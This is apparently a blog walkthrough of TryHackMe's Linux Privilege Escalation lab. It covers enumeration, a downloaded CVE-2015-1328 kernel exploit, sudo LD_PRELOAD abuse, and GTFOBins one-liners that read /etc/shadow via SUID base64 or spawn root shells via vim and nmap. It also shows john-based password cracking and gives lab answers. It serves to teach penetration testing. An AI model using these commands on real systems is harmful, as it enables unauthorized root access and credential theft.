---
title: TryHackMe - Linux Privilege Escalation
description: A walkthrough of TryHackMe's room "Linux Privilege Escalation".
categories: [Walkthrough THM, Privilege Escalation Module]
tags: [Privilege Escalation]
pin: false
---

**Lab Access:** <https://tryhackme.com/r/room/linprivesc>

## Task 1: Introduction
This room aims to give a better understanding of the main privilege escalation vectors and the process. This is an essential skill to have in various cyber security fields. 

## Task 2: What is Privilege Escalation?
Privilege escalation is essentially to go from a lower permission account to a higher permission one. This is usually done by exploiting a vulnerability, design flaw or misconfiguration in an operating system.

Higher privilege accounts will allow you to perform actions like resetting passwords, bypassing access controls and much more. 

## Task 3: Enumeration
Enumeration refers to the process of systematically gathering information about a target system or network. 
This task will cover a few basic enumeration points. You can also have a look at [hacktricks.xyz](https://book.hacktricks.xyz/linux-hardening/linux-privilege-escalation-checklist) and the privilege escalation checklist given there.

Lets look at the commands covered in the task and try to divide them into categories:

### System information
<details><summary><b>Hostname</b></summary>
Return the hostname of the target machine. Can be useful if for example corporate networks if the system's role is provided in the name.
</details>

<details><summary><b>uname -a</b></summary>
This will print system information giving additional detail about the kernel used by the system. This is useful when searching for any potential kernel vulnerabilities that could lead to privilege escalation. It might give you the system architecture (64-bit or 32 bit for example). 
</details>

<details><summary><b>cat /proc/version</b></summary>
The proc filesystem (procfs) provides information about the target system processes. You will find proc on many different Linux flavours, making it an essential tool to have in your arsenal. You will find the compiler used to build the kernel and may provide insight into the security practices of the system. For example, older compilers may have compiled the kernel without modern security hardening features making the system more vulnerable.
</details>

<details><summary><b>cat /etc/issue</b></summary>
The /etc/issue file will also provide system information like OS identification. Note that this file can be customized and can in those cases both show faulty information but also extra information from system administrators.
</details>

### Process and Environment Information
<details><summary><b>ps</b></summary>
The ps command will display information about running processes and their IDs (PIDs). This helps identify which applications and services are active on the system.
You can use <code style="background-color: black; color: gray; padding: 2px 4px; border-radius: 4px;">ps -A</code> to show all running processes or <code style="background-color: black; color: gray; padding: 2px 4px; border-radius: 4px;">ps axjs</code> to view the  process tree. you can show a detailed view of all processes running using <code style="background-color: black; color: gray; padding: 2px 4px; border-radius: 4px;">ps -aux</code>.
</details>

<details><summary><b>env</b></summary>
The env command lists all the environment variables which can provide insight into the system's configuration and the user's environment. Some that are worth to look for are:
<ul>
<li> <code style="background-color: black; color: gray; padding: 2px 4px; border-radius: 4px;">PATH</code>: This variable indicates where the system looks for executable files. Misconfigurations can lead to privilege escalation if a malicious binary is placed in a directory that appears early in the <code style="background-color: black; color: gray; padding: 2px 4px; border-radius: 4px;">path</code> 
</li>
<li> <code style="background-color: black; color: gray; padding: 2px 4px; border-radius: 4px;">HOME</code>: Displays the users home directory which might contain sensitive files or scripts. </li>
<li> <code style="background-color: black; color: gray; padding: 2px 4px; border-radius: 4px;">SHELL</code>: Indicates teh shell being used, which could influence how commands are executed or what vulnerabilities might be present. </li>
</ul>
</details>

### User and Permission information
<details><summary><b>sudo -l</b></summary>
This command lists the commands the user is allowed to run as super user.
</details>

<details><summary><b>id</b></summary>
The id command will provide a general overview of the user's UID (user ID) and GID (Group ID) this can help to understand the user's permissions and roles on the system
</details>

<details><summary><b>cat /etc/passwd</b></summary>
This will display the contents of the /etc/passwd file which contains essential information about user accounts on a linux system. Not all users are of interest in this file, try to use, for example, <code style="background-color: black; color: gray; padding: 2px 4px; border-radius: 4px;">cat /etc/passwd | grep home</code>  to get the "real" users and their info filtered out.
</details>

### Networking information
<details><summary><b>ifconfig (Deprecated, use e.g ip addr show instead)</b></summary>
The ifconfig command in Linux is used to configure and display network interfaces. It provides information about the network interfaces on the system. 
</details>

<details><summary><b>netstat</b></summary>
The netstat command in Linux is used to display network connections, routing tables, interface statistics, and other network-related information. Some of the options that can be used include: <br>
<code style="background-color: black; color: gray; padding: 2px 4px; border-radius: 4px;">netstat -a</code>: Show all listening ports and established connections  <br>
<code style="background-color: black; color: gray; padding: 2px 4px; border-radius: 4px;">nestat -at (-au)</code>: List the above and filter on TCP or UDP protocols  <br>
<code style="background-color: black; color: gray; padding: 2px 4px; border-radius: 4px;">netstat -l</code>: List ports in "listening" mode. THese ports are open ard ready to accept incomming connections. Use with "t" option to list only TCP.  <br>
<code style="background-color: black; color: gray; padding: 2px 4px; border-radius: 4px;">netstat -s</code>: list network usage statistics by protocol. combine with -t or -u to limit the output to a specific protocol. <br>
<code style="background-color: black; color: gray; padding: 2px 4px; border-radius: 4px;">netstat -tp</code>: list connections with the service name and PID information, it can also be combined with the -l to show listening ports. <br>
</details>

### File and Directory Management
<details><summary><b>history</b></summary>
Looking at earlier commands with the history command can give you some idea about the target system and, albeit rarely, have stored information such as passwords or usernames.
</details>

<details><summary><b>ls -la</b></summary>
The <code style="background-color: black; color: gray; padding: 2px 4px; border-radius: 4px;">ls -la</code> command provides a comprehensive view of all files, including hidden files, and directories in the current directory. It shows permissions, ownership and timestamps which might provide insight into who can access and modify files. 
</details>


<details><summary><b>find</b></summary>
The <code style="background-color: black; color: gray; padding: 2px 4px; border-radius: 4px;">find</code> command can help you find both text files and directories. I will refer to the TryHackMe source on this, and I really encourage you to play around with the "find" command to get the hang of it. It is very useful in everyday life when working in Linux!
</details>

---

**Q: What is the hostname of the target system?**
<details><summary>Answer</summary>
wade7363 <br>
use the "hostname" command
</details>

---

**Q: What is the Linux kernel version of the target system?**
<details><summary>Answer</summary>
3.13.0-24-generic <br>
use the "uname -a" command
</details>

---

**Q: What Linux is this?**
<details><summary>Answer</summary>
Ubuntu 14.04 LTS <br>
use "cat /etc/issue"
</details>

---

**Q: What version of the Python language is installed on the system?**
<details><summary>Answer</summary>
2.7.6 <br>
use "python -V"
</details>

---

**Q: What vulnerability seem to affect the kernel of the target system? (Enter a CVE number)**
<details><summary>Answer</summary>
CVE-2015-1328 <br>
Google will help you here! You have the kernel version from question 2.
</details>


## Task 4: Automated Enumeration Tools
There are many tools you can use for automated enumeration to save time. These tools should only be used to save time since they can miss some privilege escalation vectors. 

The target system’s environment will influence the tool you will be able to use. For example, you will not be able to run a tool written in Python if it is not installed on the target system. This is why it would be better to be familiar with a few rather than having a single go-to tool.

[LinPeas](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)  
[LinEnum](https://github.com/rebootuser/LinEnum)  
[LES (Linux Exploit Suggester)](https://github.com/mzet-/linux-exploit-suggester)
[Linux Smart Enumeration](https://github.com/diego-treitos/linux-smart-enumeration)
[Linux Priv Checker](https://github.com/linted/linuxprivchecker)

## Task 5: Privilege Escalation: Kernel Exploits
The aim of privilege escalation is essentially to reach root privileges, sometimes this can be achieved by exploiting an existing vulnerability and sometimes by accessing another user account that has more privileges, information or access.

Kernel exploit methodology is simple:
1. Identify teh kernel version
2. Search and find an exploit code for the kernel version of teh target system
3. Run the exploit.

It's often simples to just google for existing exploit code, sometimes automatic scanners can be useful but they can give both false positives and false negatives.

Note that **it is important to understand how the exploit code works BEFORE you launch it**, it could potentially make irreversible changes to the OS or cause other problems. So even if you are in a LAB environment (such as the machines on THM) try to get the habit of checking and understanding the kernel exploits (and all for that matter, but especially the kernel exploits). 

---

**Q: Find and use the appropriate kernel exploit to gain root privileges on the target system**  

Let's start with the "find" part. If you run `uname -a` you get the same kernel as in the previous task, and you can therefore use **CVE-2015-1328**. If you want to understand the code have a look at the CVE-2015-1328 Deep Dive post where I explore it in more detail. 

>**Short summary of CVE-2015-1328**  
 In essence the exploit code creates a malicious lib entry to the `ld.so.preload` file. It is a file containing a list of ELF shared objects to be loaded before any program, so it essentially causes the specified libraries to be preloaded for all programs executed on the system[^1]. By adding a library to ld.so.preload that opens a root shell, the exploit ensures that this library is executed first, granting the attacker a root shell before any other program can run. The ld.so.preload file is only writable as root, this is where the core of the exploit comes in. The exploit abuses a vulnerability in using _user namespaces_ in combination with _overlayfs_ to bypass these restrictions. 

From what you can see, "all" that happens when you run the exploit is that a root shell is loaded before all other programs, which should not cause any harm to the operating system. So let's use it!

>**Reflection**  
From a detection standpoint, it probably won't be too hard for the system administrators to figure out that the system has been compromised since it (hopefully) will be detected by a IDS or HIPS. Also this exploit has a system wide impact and other users can gain root access by running programs that use preloaded libraries. 

Start by downloading the exploit from your source of choice, I downloaded from exploitDB. 

Use for example `python3 -m http.server 8080` on your machine to allow the target machine to retrieve the file. 

On the target host navigate to `/home/matt`. You will see that there is a flag1.txt file here but you don't have permission to see it. Run `wget http://MACHINE_IP:8080/ofs.c` (given that the exploit file is called ofs.c) in this directory. You should now have downloaded the file to the target machine. Compile it using `gcc ofs.c -o ofs` which should give you an executable file called "ofs". Start the exploit by running `./ofs`.  You should now be able to show the content of flag.txt!

---

**Q: What is the content of the flag1.txt file?**
<details><summary>Answer</summary>
THM-XXXXXXXXXX, see above how to retrieve it! 
</details>

## Task6: Privilege Escalation: Sudo
The sudo command allows a user to run a program with root privileges, system administrators can regulate who has access to which program using sudo. You can check the current root privileges using the `sudo -l` command.

If the system is misconfigured, specifically the "env_keep" option is enabled for `LD_PRELOAD`, you can exploit this to gain root access. Here is how you would do this: The "env_keep" option allows the environment variables (like `LD_PRELOAD`) to be preserved _temporarily_ when running a command via `sudo`. NNormally, these environment variables are cleared to prevent privilege escalation, but if this option is set, you can specify libraries to be loaded via LD_PRELOAD while executing a command with sudo. 

To exploit this, you create a shared library (.so file) that, when loaded, changes the user ID to root and spawns a root shell. By running a command with `sudo` and specifying this custom library in `LD_PRELOAD`, for example, `sudo LD_PRELOAD=/home/user/ldpreload/shell.so find`, the library, which spawns a root shell, is executed before the find command. Since the library runs with root privileges (due to sudo), it escalates our privileges and spawns a root shell even before the find command is executed.

<https://gtfobins.github.io/> is a valuable source that provides information on how any program, on which you may have sudo rights, can be used.

---

**Q: How many programs can the user "karen" run on the target system with sudo rights?**
<details><summary>Answer</summary>
3 <br>
run sudo-l
</details>

---

**Q: What is the content of the flag2.txt file?**
<details><summary>Answer</summary>
Navigate to "/home/ubuntu/" where you will find the flag.
</details>

---

**Q: How would you use Nmap to spawn a root shell if your user had sudo rights on nmap?**
<details><summary>Answer</summary>
sudo nmap --interactive
</details>

---

**Q: What is the hash of frank's password?**
<details><summary>Answer</summary>
$6$2.s[...]B1uaqeLR1 <br>
you gotta fill in the blanks in [...]. Have a look at the /etc/shadow file.
</details>

## Task 7: Privilege Escalation: SUID
Linux privilege control rely on controlling users and files interaction using permissions such as read, write and execute. Usually permissions are given to users and files within their privilege level. In some cases, however, it might be necessary to let the files be executed with the permission level of the _owner_ or _group owner_. 

So if _root_ is the owner of an executable file, that file will run with root privileges, which can be exploited in some cases! Check gtfobins for this as well <https://gtfobins.github.io/#+suid>. 

---

**Q: Which user shares the name of a great comic book writer?**
<details><summary>Answer</summary>
gerryconway <br>
use cat /etc/passwd
</details>

---

**Q: What is the password of user2?**
Let's first check if the SUID is set for any binaries. Let's use `find / -type f -perm -04000 -ls 2>/dev/null` and see if you can find a vulnerability on gtfobins that you can use.  

> `2>/dev/null` redirects (>) standard errors (stderr) (2) to `/dev/null` which directly ignores it. Meaning that you will get a cleaner output. You could do this with any standard file descriptor:    
0=stdin  
1=stdout  
2=stderr  
So if you only want to see the errors you would use `1>/dev/null` instead.
{: .prompt-tip}

You (hopefully) found that base64 can be exploited by using:

```shell
LFILE=file_to_read
./base64 "$LFILE" | base64 --decode #Drop the ./ if it doesn't work!
```
Base 64 is used to encode/decode binary data. So what you do in the code above is to encode a file and then directly decode it, where the decoded file is printed! Nice! You might not be able to gain root shell but you will be able to print some nice files to eventually gain the password! You should be able to print the `/etc/shadow` file, which along with `/etc/passwd` could give you the password. 

Remember John? John the Ripper? If you have a file containing the `/etc/shadow` content (let's say shadow.txt) and another file with `/etc/passwd` (let's say passwd.txt) you can use `unshadow passwd.txt shadow.txt > forJohn.txt` and then `john --wordlist=/usr/share/wordlists/rockyou.txt forJohn.txt` which will give you the password!

Let's recap what you did to retain the answer:
1. We found base64 with the SUID bit set
2. We printed the /etc/shadow file using the base64 
3. We combined /etc/shadow and /etc/passwd to gain passwords

---

**Q: What is the content of the flag3.txt file?**
<details><summary>Answer</summary>
To find the flag: find / -name flag3.txt 2>/dev/null
You could print the content of /etc/shadow so you can print the content of this file. 
</details>

## Task 8: Capabilities
Letting a process or binary run as root by setting the SUID or Sudo can sometimes give way too much privilege, especially if there is a specific permission you need, e.g initiate socket connections. Instead of giving the binary root privileges, capabilities are used to manage the privileges at a granular level. There are a bunch of different capabilities, for example 

    CAP_SETUID
        * Make arbitrary manipulations of process UIDs (setuid(2), setreuid(2), setresuid(2), setfsuid(2));
        * forge UID when passing socket credentials via UNIX domain sockets;
        * write a user ID mapping in a user namespace (see user_namespaces(7)).
    
    CAP_NET_BIND_SERVICE
              Bind a socket to Internet domain privileged ports (port numbers less than 1024)

Have a look at the man pages to find the entire list.

**Q: Complete the task described above on the target system**
The task at hand is to check the capabilities and see if we can leverage them for privilege escalation. 

Let's start by checking the capabilities using `getcap -r / 2>/dev/null` where `-r` enables recursive search.
Then you get the following:
![alt text](image.png)

Vim has `cap_setuid+ep` and looking at gftobins (`https://gtfobins.github.io/gtfobins/vim/`) gives the following code for root shell: `./vim -c ':py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")' `

---
**Q: How many binaries have set capabilities?**
<details><summary>Answer</summary>
6
</details>

---

**Q: What other binary can be used through its capabilities?**
<details><summary>Answer</summary>
View
</details>

---

**Q: What is the content of the flag4.txt file?**
<details><summary>Answer</summary>
cat /home/ubuntu/flag4.txt
</details>

## Task 9: Privilege Escalation: Cron Jobs
Cron jobs are scheduled tasks that allow automation of recurring tasks, like backups, system updates and more. They are defined in crontab files where the users or system can specify what commands to run and when. Having cronjobs reduces the need for manual intervention in repetitive tasks and the tasks are executed regularly without delay or human error. For example, it is convenient to have system maintenance tasks running in the evening or at night and not on peak hours.

You can see all the cron jobs when running `cat /etc/crontab`, you will also find the following explaining the structure of the cron job definition:
```shell
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed
```

If a cron job script or binary is writable by a lower privileged user, the script can be modified to execute malicious code with elevated privileges.

You need to manually remove cron jobs when they are no longer needed. Let's say you remove a script, the cron job will still be there. This could be a security risk, especially if the full path of the script is not defined. If the full path is not defined cron will refer to the paths listed under `PATH` (see code above). An attacker could then create a script with the same name in a directory that is listed in the `PATH` variable, which would run on the cron job on schedule.

---

**Q: **
<details><summary>Answer</summary>
</details>

---

**Q:**
<details><summary>Answer</summary>
</details>

---

**Q:**
<details><summary>Answer</summary>
</details>

---

[^1]: <https://man7.org/linux/man-pages/man8/ld.so.8.html>